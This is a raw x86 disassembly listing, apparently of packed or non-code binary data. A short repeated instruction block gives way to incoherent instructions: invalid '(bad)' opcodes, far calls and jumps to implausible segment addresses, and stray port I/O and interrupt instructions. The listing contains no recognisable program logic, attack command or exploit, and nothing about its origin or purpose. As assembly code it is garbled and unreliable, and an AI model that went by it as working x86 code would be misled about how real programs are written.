  421b93:	mov    dh,BYTE PTR [eax-0x55552ef1]
  421b99:	push   esp
  421b9a:	dec    edx
  421b9b:	and    al,BYTE PTR [ecx-0x20]
  421b9e:	jo     0x421bce
  421ba0:	mov    dh,BYTE PTR [eax-0x55552ef1]
  421ba6:	push   esp
  421ba7:	dec    edx
  421ba8:	and    al,BYTE PTR [ecx-0x20]
  421bab:	jo     0x421bdb
  421bad:	mov    dh,BYTE PTR [eax-0x55552ef1]
  421bb3:	push   esp
  421bb4:	dec    edx
  421bb5:	and    al,BYTE PTR [ecx-0x20]
  421bb8:	jo     0x421be8
  421bba:	mov    dh,BYTE PTR [eax-0x55552ef1]
  421bc0:	push   esp
  421bc1:	dec    edx
  421bc2:	and    al,BYTE PTR [ecx-0x20]
  421bc5:	jo     0x421bf5
  421bc7:	mov    dh,BYTE PTR [eax-0x55552ef1]
  421bcd:	push   esp
  421bce:	dec    edx
  421bcf:	and    al,BYTE PTR [ecx-0x20]
  421bd2:	jo     0x421c02
  421bd4:	mov    dh,BYTE PTR [eax-0x55552ef1]
  421bda:	push   esp
  421bdb:	dec    edx
  421bdc:	and    al,BYTE PTR [ecx-0x20]
  421bdf:	jo     0x421c0f
  421be1:	mov    dh,BYTE PTR [eax-0x55552ef1]
  421be7:	push   esp
  421be8:	dec    edx
  421be9:	dec    ebp
  421bea:	jmp    0x8a438cda
  421bef:	mov    al,0x1f
  421bf1:	shr    DWORD PTR [edx+0x5390f680],1
  421bf7:	daa    
  421bf8:	pop    ds
  421bf9:	pop    ebp
  421bfa:	mov    al,0xd
  421bfc:	loopne 0x421be0
  421bfe:	out    0x42,eax
  421c00:	mov    ecx,0x3044dfe0
  421c05:	sub    bh,BYTE PTR fs:0xbc19073b
  421c0c:	dec    esi
  421c0d:	and    ch,dl
  421c0f:	mov    WORD PTR [ebx+eiz*1],cs
  421c12:	jo     0x421c63
  421c14:	pop    ss
  421c15:	mov    ecx,0x88c6beff
  421c1a:	stos   BYTE PTR es:[edi],al
  421c1b:	jae    0x421c0a
  421c1d:	stos   BYTE PTR es:[edi],al
  421c1e:	adc    al,0xb1
  421c20:	sbb    eax,0xd28db887
  421c25:	lds    ebx,FWORD PTR [ebx]
  421c27:	retf   0x945b
  421c2a:	push   es
  421c2b:	cli    
  421c2c:	lods   al,BYTE PTR ds:[esi]
  421c2d:	mov    ds:0x9148a5eb,eax
  421c32:	fild   DWORD PTR [ebp-0x32]
  421c35:	je     0x421c20
  421c37:	sub    eax,0x6b5d4ab0
  421c3c:	repnz neg BYTE PTR [esi-0x6e]
  421c40:	sbb    edx,DWORD PTR fs:[edx]
  421c43:	arpl   WORD PTR [edi-0x24],bx
  421c46:	popa   
  421c47:	sub    cl,ah
  421c49:	lea    eax,[ecx*4+0x754ec1e2]
  421c50:	mov    edx,0xd680ca43
  421c55:	cmp    ah,BYTE PTR [esi-0x1e065ba9]
  421c5b:	dec    ebp
  421c5c:	imul   ebp,edx,0x39
  421c5f:	push   ds
  421c60:	push   edx
  421c61:	retf   0x3668
  421c64:	retf   
  421c65:	es xchg ebx,eax
  421c67:	test   BYTE PTR [ebp+0x65],dl
  421c6a:	jnp    0x421c5a
  421c6c:	imul   bh
  421c6e:	push   ds
  421c6f:	mov    esp,ss
  421c71:	or     eax,0x6eefdb22
  421c76:	rol    DWORD PTR [ebx],0xad
  421c79:	jb     0x421bff
  421c7b:	arpl   WORD PTR [edx+0xd],bx
  421c7e:	cwde   
  421c7f:	dec    ebp
  421c80:	lea    ebp,[edi+edx*1]
  421c83:	jns    0x421c3d
  421c85:	sub    ch,cl
  421c87:	mov    cl,0x68
  421c89:	popf   
  421c8a:	mov    WORD PTR [edi],ds
  421c8c:	inc    ebp
  421c8d:	and    DWORD PTR [eax+0x3a051423],esi
  421c93:	ins    DWORD PTR es:[edi],dx
  421c94:	push   esi
  421c95:	call   0x2520:0x999cf096
  421c9c:	shl    BYTE PTR [edi+ebx*2+0x8],0x46
  421ca1:	xchg   ebp,eax
  421ca2:	sbb    ebx,esp
  421ca4:	cmp    cl,BYTE PTR [esi+0x5661129d]
  421caa:	pop    ebp
  421cab:	push   esp
  421cac:	mov    al,ds:0xdc43d83
  421cb1:	gs pop ds
  421cb3:	rol    BYTE PTR [eax],1
  421cb5:	and    eax,0xfe840282
  421cba:	aad    0xf7
  421cbc:	or     dl,BYTE PTR [ebx]
  421cbe:	jl     0x421c7e
  421cc0:	dec    eax
  421cc1:	and    eax,0xe7dfb90a
  421cc6:	lahf   
  421cc7:	(bad)  
  421cc8:	push   0x47627373
  421ccd:	ja     0x421c92
  421ccf:	out    0xb8,al
  421cd1:	mov    dl,0xb4
  421cd3:	int    0x11
  421cd5:	adc    al,bh
  421cd7:	pop    edi
  421cd8:	popa   
  421cd9:	mov    eax,ds:0x8a4b0dfb
  421cde:	ss xchg esi,eax
  421ce0:	cmp    esp,DWORD PTR [ebp-0x63]
  421ce3:	cmp    al,bh
  421ce5:	mov    dh,0x33
  421ce7:	xlat   BYTE PTR ds:[ebx]
  421ce8:	jmp    0xb6f5:0x26d2f999
  421cef:	inc    esp
  421cf0:	les    ebp,FWORD PTR [eax+0x1844ae20]
  421cf6:	xor    al,0xeb
  421cf8:	xchg   esp,eax
  421cf9:	ins    BYTE PTR es:[edi],dx
  421cfa:	in     al,dx
  421cfb:	out    0x51,al
  421cfd:	rcl    DWORD PTR [eax+0x2e],cl
  421d00:	jmp    0x49e7:0xb6a52d9f
  421d07:	push   ds
  421d08:	fcomp  DWORD PTR [ebp+edi*1-0x244fece5]
  421d0f:	rol    bl,1
  421d11:	icebp  
  421d12:	cmp    DWORD PTR [ebx+0xa654eb5],0xffffffea
  421d19:	dec    ebx
  421d1a:	xor    esp,0x152f6c5b
  421d20:	cmp    eax,ebp
  421d22:	outs   dx,DWORD PTR ds:[esi]
  421d23:	cmp    dh,BYTE PTR [edi]
  421d25:	fistp  QWORD PTR [ebx]
  421d27:	dec    ecx
  421d28:	scas   al,BYTE PTR es:[edi]
  421d29:	shl    BYTE PTR [edi+ebp*4-0x12],0xbe
  421d2e:	push   edi
  421d2f:	cvttps2pi mm0,QWORD PTR [ebx+edi*8-0x23]
  421d34:	pusha  
  421d35:	jno    0x421d5c
  421d37:	out    0x0,al
  421d39:	gs (bad) 
  421d3b:	dec    ebx
  421d3c:	mov    bl,0xd8
  421d3e:	pop    edi
  421d3f:	push   ebx
  421d40:	sub    eax,0x9aff012b
  421d45:	add    bh,BYTE PTR [edi]
  421d47:	xchg   edi,eax
  421d48:	cmp    eax,0xa3c2455
  421d4d:	outs   dx,DWORD PTR ds:[esi]
  421d4e:	imul   esp,DWORD PTR [edi-0x22],0xfffffff5
  421d52:	cmp    BYTE PTR [ebx],dl
  421d54:	push   ebx
  421d55:	ficom  DWORD PTR [esi+eiz*8]
  421d58:	cld    
  421d59:	in     eax,dx
  421d5a:	mov    ds:0x1ba66276,eax
  421d5f:	leave  
  421d60:	jmp    0x421d38
  421d62:	mov    bh,al
  421d64:	and    al,0x3d
  421d66:	gs mov ah,0xc6
  421d69:	scas   al,BYTE PTR es:[edi]
  421d6a:	adc    eax,0x1d70ffd4
  421d6f:	jbe    0x421ddd
  421d71:	out    dx,al
  421d72:	stc    
  421d73:	mov    ss,WORD PTR [edi]
  421d75:	in     al,dx
  421d76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421d77:	add    BYTE PTR [ebx-0x62c68554],ah
  421d7d:	mov    edi,0x3c513890
  421d82:	and    DWORD PTR [ecx-0x7b],eax
  421d85:	sbb    eax,0xe53824a2
  421d8a:	pop    es
  421d8b:	in     al,0x52
  421d8d:	push   edi
  421d8e:	and    DWORD PTR [edx-0x687f3794],edx
  421d94:	mov    ebx,0x89f85cac
  421d99:	repnz and eax,0x577ed6cf
  421d9f:	cmp    BYTE PTR [ebp+0x3d],dl
  421da2:	jmp    0x421dfc
  421da4:	lods   eax,DWORD PTR ds:[esi]
  421da5:	ss push edx
  421da7:	mul    DWORD PTR gs:[edx]
  421daa:	outs   dx,BYTE PTR ds:[esi]
  421dab:	into   
  421dac:	out    dx,eax
  421dad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421dae:	test   al,0x47
  421db0:	mov    bl,bh
  421db2:	push   0x72
  421db4:	imul   ebx,DWORD PTR [edx],0xffffffc8
  421db7:	je     0x9cd24b80
  421dbd:	add    ebx,edi
  421dbf:	cmp    edi,ebp
  421dc1:	sub    DWORD PTR [edx+ebp*2],ebx
  421dc4:	mov    eax,0xeb31fac7
  421dc9:	pushf  
  421dca:	mov    edi,0x94188e45
  421dcf:	loopne 0x421e29
  421dd1:	push   ebp
  421dd2:	lods   eax,DWORD PTR ds:[esi]
  421dd3:	jb     0x421dc5
  421dd5:	adc    DWORD PTR [edi+0x43b3dea3],edi
  421ddb:	xlat   BYTE PTR ds:[ebx]
  421ddc:	cmp    ebx,DWORD PTR [ebx]
  421dde:	inc    ebx
  421ddf:	pop    ebp
  421de0:	jg     0x421e47
  421de2:	daa    
  421de3:	mov    BYTE PTR [ebx+0x69],bl
  421de6:	add    bh,BYTE PTR [ebp-0x3d]
  421de9:	pop    ss
  421dea:	cmp    al,0xc1
  421dec:	add    cl,dl
  421dee:	fcomp  st(4)
  421df0:	xor    ch,BYTE PTR [edx-0x18b6e473]
  421df6:	or     dl,BYTE PTR [ebp+0xc]
  421df9:	mov    ebx,0x5599e65e
  421dfe:	adc    DWORD PTR [edi-0x697b9627],eax
  421e04:	jae    0x421d8f
  421e06:	sbb    esp,DWORD PTR ds:0x30665f16
  421e0c:	push   eax
  421e0d:	dec    edi
  421e0e:	imul   edx,DWORD PTR ds:[edx],0xffffff9e
  421e12:	pop    ebx
  421e13:	or     al,0xe7
  421e15:	sahf   
  421e16:	daa    
  421e17:	push   esp
  421e18:	ret    
  421e19:	add    ch,ah
  421e1b:	sub    ecx,esi
  421e1d:	xchg   esi,eax
  421e1e:	push   es
  421e1f:	sub    eax,0xdbb492f6
  421e24:	or     ebx,DWORD PTR [edx+eiz*1-0x4158926c]
  421e2b:	cbw    
  421e2d:	push   cs
  421e2e:	cmc    
  421e2f:	mov    ecx,0x5cf40c46
  421e34:	xor    DWORD PTR [edi+edi*2-0x16b5ee9d],esi
  421e3b:	lods   al,BYTE PTR ds:[esi]
  421e3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421e3d:	das    
  421e3e:	loope  0x421ea2
  421e40:	addr16 xchg esp,eax
  421e42:	test   eax,0x4dab2976
  421e47:	sar    ah,1
  421e49:	jbe    0x421ea3
  421e4b:	adc    eax,0x154a71b3
  421e50:	xor    esi,DWORD PTR [edi-0x5ed0080d]
  421e56:	pushf  
  421e57:	dec    edi
  421e58:	sub    DWORD PTR ds:0xdad319a6,ebx
  421e5e:	cmc    
  421e5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421e60:	jbe    0x421e91
  421e62:	cli    
  421e63:	lods   eax,DWORD PTR ds:[esi]
  421e64:	int3   
  421e65:	test   DWORD PTR [edx-0x12],ebp
  421e68:	cmp    ebx,DWORD PTR [edx-0x4cb309be]
  421e6e:	xchg   ecx,eax
  421e6f:	cmp    edi,DWORD PTR [esi+0x6e]
  421e72:	inc    ecx
  421e73:	cwde   
  421e74:	push   ebp
  421e75:	inc    edx
  421e76:	or     esp,edx
  421e78:	in     al,dx
  421e79:	add    al,0x7b
  421e7b:	cmp    edi,DWORD PTR [edx]
  421e7d:	aad    0x1f
  421e7f:	call   0x66dd:0xf4583968
  421e86:	ficom  DWORD PTR [eax]
  421e88:	push   esi
  421e89:	out    0x2c,al
  421e8b:	sbb    edx,DWORD PTR [ebp-0x3b]
  421e8e:	adc    BYTE PTR [ebp+0x78],cl
  421e91:	mov    eax,0x7b960d8a
  421e96:	frstor [eax]
  421e98:	dec    esi
  421e99:	ret    0x4820
  421e9c:	mov    eax,ds:0x44420498
  421ea1:	dec    esp
  421ea2:	cwde   
  421ea3:	adc    ecx,edi
  421ea5:	add    dh,ah
  421ea7:	adc    ch,dl
  421ea9:	sti    
  421eaa:	add    bl,cl
  421eac:	popf   
  421ead:	leave  
  421eae:	push   0x1f
  421eb0:	daa    
  421eb1:	mov    DWORD PTR [edx+0x7],0xa30bc6ec
  421eb8:	jbe    0x421e53
  421eba:	out    0x6b,eax
  421ebc:	sar    DWORD PTR [ebx-0x5634d0ee],cl
  421ec2:	in     eax,0x1a
  421ec4:	addr16 push cs
  421ec6:	adc    BYTE PTR [ebp+0x27],dh
  421ec9:	or     DWORD PTR [esi],ebp
  421ecb:	shl    BYTE PTR [ebx-0x1c11bda3],1
  421ed1:	jecxz  0x421f51
  421ed3:	out    dx,eax
  421ed4:	mov    ds:0x4e553908,eax
  421ed9:	mov    cs,WORD PTR [ebp+0x5c]
  421edc:	jecxz  0x421e64
  421ede:	bound  ebx,QWORD PTR [ebx-0x2]
  421ee1:	sqrtps xmm6,XMMWORD PTR ds:0xa0cc28fd
  421ee8:	stc    
  421ee9:	ja     0x421f2c
  421eeb:	cwde   
  421eec:	(bad)  
  421eed:	xchg   esp,eax
  421eee:	fmul   DWORD PTR [edi+0x37ddb5cc]
  421ef4:	mov    ds:0x8670662a,al
  421ef9:	lock cmp edi,DWORD PTR [eax]
  421efc:	jae    0x421f50
  421efe:	jmp    0x96d39c8b
  421f03:	dec    edi
  421f04:	(bad)  
  421f05:	push   0xffffffa4
  421f07:	pushf  
  421f08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421f09:	sbb    eax,0x97822f17
  421f0e:	test   BYTE PTR [edx+0x285d84ae],bh
  421f14:	data16 aad 0xff
  421f17:	scas   al,BYTE PTR es:[edi]
  421f18:	and    dh,BYTE PTR [edi+0x7]
  421f1b:	loope  0x421f62
  421f1d:	jns    0x421f49
  421f1f:	push   ds
  421f20:	add    edx,DWORD PTR [esi-0x6a]
  421f23:	add    DWORD PTR [eax],ebx
  421f25:	jbe    0x421f14
  421f27:	leave  
  421f28:	int    0x60
  421f2a:	popf   
  421f2b:	cmp    eax,0x50dd683c
  421f30:	lahf   
  421f31:	adc    ebp,DWORD PTR [ebx+0x5d]
  421f34:	jmp    0xf947b97d
  421f39:	xor    cl,0x16
  421f3c:	or     eax,eax
  421f3e:	cld    
  421f3f:	or     eax,0xad614d8
  421f44:	xchg   esi,eax
  421f45:	int3   
  421f46:	dec    BYTE PTR [edx+0x76]
  421f49:	sbb    eax,0x426cc9f0
  421f4e:	cmc    
  421f4f:	inc    edx
  421f50:	sub    eax,0x547e12f7
  421f55:	sub    BYTE PTR [ebx-0x47],0x58
  421f59:	pop    ss
  421f5a:	inc    ebx
  421f5b:	loop   0x421faa
  421f5d:	xchg   edx,eax
  421f5e:	adc    eax,0x605128aa
  421f63:	mov    DWORD PTR [esi+edi*8],0x9b62941b
  421f6a:	jmp    0xac62dbbb
  421f6f:	outs   dx,DWORD PTR ds:[si]
  421f71:	mov    ah,0x9c
  421f73:	dec    esi
  421f74:	or     DWORD PTR [eax],edi
  421f76:	lods   eax,DWORD PTR ds:[esi]
  421f77:	test   eax,0xdf666dd6
  421f7c:	pop    edx
  421f7d:	xor    BYTE PTR [ebx+ebx*4],bl
  421f80:	lock ja 0x421fd5
  421f83:	sbb    BYTE PTR [ebx+0x1c],al
  421f86:	add    ebp,DWORD PTR [edi]
  421f88:	(bad)  
  421f89:	sbb    al,0x5e
  421f8b:	out    0xac,al
  421f8d:	adc    edi,esp
  421f8f:	and    bl,cl
  421f91:	test   al,0x2c
  421f93:	inc    eax
  421f94:	dec    ebx
  421f95:	inc    eax
  421f96:	popa   
  421f97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421f98:	aam    0xb2
  421f9a:	inc    esi
  421f9b:	cmp    DWORD PTR [edx],esp
  421f9d:	scas   eax,DWORD PTR es:[edi]
  421f9e:	cli    
  421f9f:	nop
  421fa0:	xor    esp,DWORD PTR [ecx+0x5d]
  421fa3:	jl     0x421fed
  421fa5:	sbb    al,0x2
  421fa7:	and    BYTE PTR [edi+0xc],bh
  421faa:	sar    BYTE PTR [edx+0x49],0x5a
  421fae:	pop    ss
  421faf:	(bad)  
  421fb0:	fimul  WORD PTR [edx-0x4c]
  421fb3:	imul   ebx,DWORD PTR [ebx-0x72],0xa
  421fb7:	ret    
  421fb8:	push   esi
  421fb9:	aad    0xd6
  421fbb:	jo     0x421ff0
  421fbd:	jb     0x421f81
  421fbf:	clc    
  421fc0:	les    esi,FWORD PTR [eax+0x7c]
  421fc3:	lahf   
  421fc4:	or     ecx,DWORD PTR [ecx+eiz*8]
  421fc7:	push   cs
  421fc8:	xlat   BYTE PTR ds:[ebx]
  421fc9:	xor    BYTE PTR [esi-0x5],bh
  421fcc:	xor    esi,esi
  421fce:	nop
  421fcf:	ret    
  421fd0:	test   DWORD PTR [edi],esp
  421fd2:	xor    edx,esi
  421fd4:	cmp    ecx,ecx
  421fd6:	mov    esp,0x3e9e3825
  421fdb:	push   eax
  421fdc:	rol    DWORD PTR [edx+0x330283c],cl
  421fe2:	scas   al,BYTE PTR es:[edi]
  421fe3:	pop    es
  421fe4:	adc    eax,0xed1690a8
  421fe9:	mov    al,0x43
  421feb:	push   ebx
  421fec:	add    eax,0x1e0e2e1e
  421ff1:	mov    al,0xe9
  421ff3:	add    bl,BYTE PTR [edi-0xe]
  421ff6:	std    
  421ff7:	dec    ebp
  421ff8:	mov    ecx,DWORD PTR [eax+0x33]
  421ffb:	ss lahf 
  421ffd:	sar    DWORD PTR [ecx],cl
  421fff:	sub    edx,DWORD PTR [esi]
  422001:	cmp    edx,DWORD PTR [ecx-0x13]
  422004:	add    ebp,DWORD PTR [esi+eax*2-0x19]
  422008:	adc    al,0x76
  42200a:	mov    ah,0x54
  42200c:	jno    0x421ffe
  42200e:	test   BYTE PTR [eax-0x41],dh
  422011:	jno    0x422041
  422013:	mov    ecx,0xc7656d2f
  422018:	pop    edx
  422019:	push   0xc35fe71a
  42201e:	mov    ecx,0x6d1a8829
  422023:	fld    QWORD PTR [edi+0x423f2fb1]
  422029:	sub    ah,ah
  42202b:	pop    ebp
  42202c:	fdivr  QWORD PTR [ebp+esi*2-0x2ecb88a8]
  422033:	mov    ah,0x10
  422035:	jns    0x42207f
  422037:	lock in al,0x1d
  42203a:	dec    eax
  42203b:	push   ebp
  42203c:	call   0xe1c3:0x5c043879
  422043:	and    eax,0x381e8390
  422048:	sbb    ecx,edi
  42204a:	pop    esp
  42204b:	fisttp QWORD PTR [ebx]
  42204d:	jbe    0x422045
  42204f:	js     0x421fd5
  422051:	add    edi,eax
  422053:	xchg   esi,eax
  422054:	mov    ch,0x4b
  422056:	mov    esp,DWORD PTR [edi-0x5f278bbc]
  42205c:	retf   0xfea9
  42205f:	(bad)  
  422060:	pop    ecx
  422061:	jle    0x422090
  422063:	into   
  422064:	enter  0xc1e3,0xe3
  422068:	sbb    edx,DWORD PTR [esi+0x5f]
  42206b:	jmp    0x90cec55f
  422070:	imul   ecx,DWORD PTR [ecx+0x5e],0xffffffb1
  422074:	pop    ecx
  422075:	adc    cl,BYTE PTR [esi]
  422077:	fiadd  DWORD PTR [ecx]
  422079:	xchg   edi,eax
  42207a:	jg     0x422074
  42207c:	out    0x91,al
  42207e:	ss cmp al,0x15
  422081:	jb     0x4220ed
  422083:	mov    dl,0xa6
  422085:	daa    
  422086:	hlt    
  422087:	out    dx,al
  422088:	(bad)  
  422089:	xchg   ebp,eax
  42208a:	std    
  42208b:	mov    ebx,DWORD PTR [esi+0x2a]
  42208e:	into   
  42208f:	pop    edx
  422090:	dec    eax
  422091:	mov    bh,BYTE PTR [ecx]
  422093:	pop    ebx
  422094:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422095:	fdivr  DWORD PTR [esi]
  422097:	push   es
  422098:	mov    esi,0xbe9cffc9
  42209d:	fiadd  DWORD PTR [esi-0x24]
  4220a0:	mov    eax,0x440e3666
  4220a5:	dec    edi
  4220a6:	mov    cl,0x7c
  4220a8:	shl    DWORD PTR [ebx-0x28],1
  4220ab:	inc    ebp
  4220ac:	adc    ch,BYTE PTR [ebx-0x7c]
  4220af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4220b0:	daa    
  4220b1:	std    
  4220b2:	dec    ecx
  4220b3:	cli    
  4220b4:	mov    DWORD PTR [eax+0x439441d2],ebp
  4220ba:	inc    edi
  4220bb:	jmp    0x4220d3
  4220bd:	int3   
  4220be:	xchg   esi,eax
  4220bf:	inc    edx
  4220c0:	cmp    BYTE PTR [ecx],ch
  4220c2:	mov    ecx,0x88bfbc5f
  4220c7:	repnz out 0x8f,al
  4220ca:	pop    ebx
  4220cb:	fimul  WORD PTR [eax-0x24b5f642]
  4220d1:	sub    eax,0x51511fc9
  4220d6:	scas   al,BYTE PTR es:[edi]
  4220d7:	dec    ecx
  4220d8:	push   edx
  4220d9:	inc    esp
  4220da:	daa    
  4220db:	cli    
  4220dc:	lds    ecx,FWORD PTR [ecx-0x79]
  4220df:	pop    ebp
  4220e0:	push   ebx
  4220e1:	push   esp
  4220e2:	imul   ebp,DWORD PTR [eax+0x3a189d0],0x68
  4220e9:	sbb    al,0x42
  4220eb:	pusha  
  4220ec:	lods   al,BYTE PTR ds:[esi]
  4220ed:	mov    BYTE PTR [eax-0x19f31839],dh
  4220f3:	inc    eax
  4220f4:	xor    eax,ebx
  4220f6:	jecxz  0x422083
  4220f8:	mov    ch,0xbf
  4220fa:	pop    esp
  4220fb:	int    0x5f
  4220fd:	xchg   DWORD PTR [ebp+0x60],esi
  422100:	das    
  422101:	and    DWORD PTR [ecx],ebp
  422103:	or     cl,bh
  422105:	fadd   QWORD PTR [eax-0xb]
  422108:	xchg   ebx,eax
  422109:	pop    esi
  42210a:	jmp    0x422123
  42210c:	cmp    cl,BYTE PTR [ebx-0x7d]
  42210f:	sbb    edi,ebp
  422111:	dec    esp
  422112:	rol    BYTE PTR [edi-0x74026a59],cl
  422118:	mov    eax,0xc722e107
  42211d:	ret    0xd942
  422120:	mov    ds:0xacff8528,eax
  422125:	icebp  
  422126:	loope  0x42219b
  422128:	imul   DWORD PTR fs:[edi-0x85a9b90]
  42212f:	mov    ds:0x2cfedcb7,eax
  422134:	pop    eax
  422135:	jmp    0x42211f
  422137:	ficomp DWORD PTR [ecx-0x3fed00fe]
  42213d:	jge    0x4402b534
  422143:	mov    ebx,0x11b4b246
  422148:	jo     0x42217b
  42214a:	mov    edi,0x110bb015
  42214f:	sar    DWORD PTR [ebp-0x40],cl
  422152:	add    ah,BYTE PTR [edx-0x2e]
  422155:	adc    ecx,eax
  422157:	jae    0x4221b2
  422159:	push   ebx
  42215a:	mov    ds:0x92571d16,eax
  42215f:	adc    al,0xde
  422161:	rol    edx,0xb0
  422164:	call   0x822a:0x368ddd46
  42216b:	popf   
  42216c:	jmp    0x47804a79
  422171:	jmp    0xead5:0xc8f508f2
  422178:	mov    esp,0x7af32e2
  42217d:	sub    BYTE PTR [esi+0xc],ah
  422180:	idiv   BYTE PTR [esi]
  422182:	cld    
  422183:	cmp    BYTE PTR [ecx+0x66],cl
  422186:	mov    DWORD PTR [edx+0x17],ebx
  422189:	imul   BYTE PTR [eax+0x7b30be]
  42218f:	pop    ss
  422190:	dec    edi
  422191:	ins    BYTE PTR es:[edi],dx
  422192:	mov    eax,ds:0x2a1aab13
  422197:	xlat   BYTE PTR ds:[ebx]
  422198:	push   ss
  422199:	mov    esp,0x2ea2ab3c
  42219e:	push   ebp
  42219f:	into   
  4221a0:	cmp    eax,0xfc5ad39e
  4221a5:	out    0xbd,al
  4221a7:	push   ebp
  4221a8:	cdq    
  4221a9:	mov    edi,DWORD PTR [ecx]
  4221ab:	push   0x75
  4221ad:	cld    
  4221ae:	adc    ecx,ebx
  4221b0:	push   edx
  4221b1:	or     DWORD PTR gs:[ebx+0x47],ebp
  4221b5:	loop   0x4221c6
  4221b7:	and    eax,0x77696eab
  4221bc:	dec    esp
  4221bd:	test   dl,0xfa
  4221c0:	xor    eax,0x1bf8673
  4221c5:	xlat   BYTE PTR ds:[ebx]
  4221c6:	daa    
  4221c7:	call   0xc859:0x91510e12
  4221ce:	aam    0xfc
  4221d0:	mov    esp,esp
  4221d2:	adc    DWORD PTR [eax],eax
  4221d4:	arpl   WORD PTR [eax-0x23c72001],bx
  4221da:	and    BYTE PTR [edx-0xc7d7f67],dl
  4221e0:	(bad)  
  4221e1:	mov    esp,0x9ade136e
  4221e6:	ja     0x42216f
  4221e8:	mov    dl,0x71
  4221ea:	inc    edx
  4221eb:	(bad)  
  4221ec:	jle    0x42217b
  4221ee:	rcr    DWORD PTR [ecx-0x44],0xfc
  4221f2:	mov    ecx,0x24258f14
  4221f7:	add    ebp,esp
  4221f9:	div    BYTE PTR [edi+0x3857d0d]
  4221ff:	mov    edi,0x464d00c5
  422204:	xor    bh,BYTE PTR [edi-0x73]
  422207:	cmp    eax,0x2e51f9bf
  42220c:	out    dx,eax
  42220d:	aam    0x25
  42220f:	mov    ebx,0xb10d03d
  422214:	ins    DWORD PTR es:[edi],dx
  422215:	sbb    bl,BYTE PTR [esi-0x29]
  422218:	inc    edx
  422219:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42221a:	data16 fild QWORD PTR [ebp-0x43]
  42221e:	dec    edi
  42221f:	pop    esi
  422220:	arpl   WORD PTR [edx*1+0x64f34e45],dx
  422227:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422228:	adc    al,0xb2
  42222a:	mov    ds:0x83f08827,al
  42222f:	adc    cl,BYTE PTR [ecx-0x74132789]
  422235:	mov    ah,BYTE PTR [ecx]
  422237:	dec    ecx
  422238:	cmp    al,0x5c
  42223a:	stc    
  42223b:	adc    BYTE PTR [eax],ch
  42223d:	mov    al,0xb8
  42223f:	loope  0x422211
  422241:	rol    DWORD PTR [esi+0x253a7874],cl
  422247:	test   eax,0x566710f0
  42224c:	(bad)  
  42224d:	repz mov edi,0x686eb47e
  422253:	xlat   BYTE PTR ds:[ebx]
  422254:	arpl   WORD PTR [edx],ax
  422256:	push   es
  422257:	pop    ebx
  422258:	inc    edx
  422259:	jle    0x422253
  42225b:	mov    ebp,0x45788779
  422260:	dec    edi
  422261:	mov    edx,0xa31931ac
  422266:	fwait
  422267:	ja     0x4222e0
  422269:	ja     0x422217
  42226b:	mov    cl,0x0
  42226d:	jp     0x422217
  42226f:	ins    DWORD PTR es:[edi],dx
  422270:	lods   al,BYTE PTR ds:[esi]
  422271:	out    0xae,eax
  422273:	fs push esi
  422275:	scas   al,BYTE PTR es:[edi]
  422276:	sbb    dl,BYTE PTR es:[edi+0x17]
  42227a:	imul   edx,DWORD PTR [edx+0x15],0x54549959
  422281:	inc    ecx
  422282:	lods   eax,DWORD PTR ds:[esi]
  422283:	scas   eax,DWORD PTR es:[edi]
  422284:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422285:	add    dh,cl
  422287:	mov    ch,0xa6
  422289:	jecxz  0x4222b9
  42228b:	pop    edx
  42228c:	ja     0x4222b4
  42228e:	adc    BYTE PTR [edx],bh
  422290:	(bad)  
  422291:	fcmovne st,st(0)
  422293:	xchg   BYTE PTR [edx+0x41],cl
  422296:	ror    DWORD PTR [edi-0x740f9c46],cl
  42229c:	inc    esp
  42229d:	xor    ecx,DWORD PTR [esi+0x30808b7b]
  4222a3:	rcl    DWORD PTR [ecx+0x2b],0x3e
  4222a7:	inc    ebp
  4222a8:	or     dh,0xa4
  4222ab:	add    eax,0x7a2926fc
  4222b0:	cmp    al,dl
  4222b2:	dec    eax
  4222b3:	scas   eax,DWORD PTR es:[edi]
  4222b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4222b5:	imul   esp,esp,0xffffffbd
  4222b8:	mov    bh,0xe6
  4222ba:	sub    BYTE PTR [esi-0x10e36231],al
  4222c0:	adc    eax,0x5c6f42a8
  4222c5:	or     bh,BYTE PTR [ecx+esi*8]
  4222c8:	mov    ds:0x4e3bb4b2,al
  4222cd:	pusha  
  4222ce:	cmp    eax,0xf3c9ae8
  4222d3:	es jp  0x4222f6
  4222d6:	mov    al,0x9a
  4222d8:	popf   
  4222d9:	lds    edi,FWORD PTR [ecx]
  4222db:	cmc    
  4222dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4222dd:	pop    ebx
  4222de:	sbb    DWORD PTR [ebp-0x2c4de9d9],esi
  4222e4:	jecxz  0x42227e
  4222e6:	cld    
  4222e7:	and    edi,DWORD PTR [ebx]
  4222e9:	fwait
  4222ea:	push   ecx
  4222eb:	mov    ebp,0x3af843f0
  4222f0:	cmp    eax,0xde9a6519
  4222f5:	int    0x32
  4222f7:	adc    BYTE PTR ds:0xd420a59,dh
  4222fd:	cwde   
  4222fe:	and    BYTE PTR ds:0xee539758,ch
  422304:	aad    0xe9
  422306:	inc    edx
  422307:	or     BYTE PTR [esi],bl
  422309:	ror    DWORD PTR [edi-0x6d28ce7b],1
  42230f:	xor    al,0x4
  422311:	push   edx
  422312:	dec    edx
  422313:	shl    DWORD PTR [edx],cl
  422315:	mov    eax,0xf5c1af6e
  42231a:	mov    ch,0xff
  42231c:	xchg   ebx,eax
  42231d:	fmul   QWORD PTR [esi+0x746d4f1d]
  422323:	nop
  422324:	shl    DWORD PTR [ebx+0x485bb2db],cl
  42232a:	cmp    BYTE PTR [eax+0x3b0f2bec],ch
  422330:	repnz xor DWORD PTR [ebp+ecx*4-0x23cf873],ecx
  422338:	xor    al,0x7f
  42233a:	sti    
  42233b:	cdq    
  42233c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42233d:	sub    ebp,DWORD PTR [edx]
  42233f:	jo     0x4222d8
